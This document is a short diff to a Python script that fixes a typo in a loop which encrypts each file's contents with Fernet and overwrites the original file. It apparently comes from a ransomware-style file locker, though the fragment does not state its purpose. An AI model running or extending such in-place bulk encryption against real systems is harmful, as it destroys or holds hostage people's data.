@@ -25,4 +25,4 @@ for file in files:
                 contents = thefile.read()
         contents_encrypted = Fernet(key).encrypt(contents)
         with open(file, "wb") as thefile:
-                thefile.write(contents encrypted)
+                thefile.write(contents_encrypted)
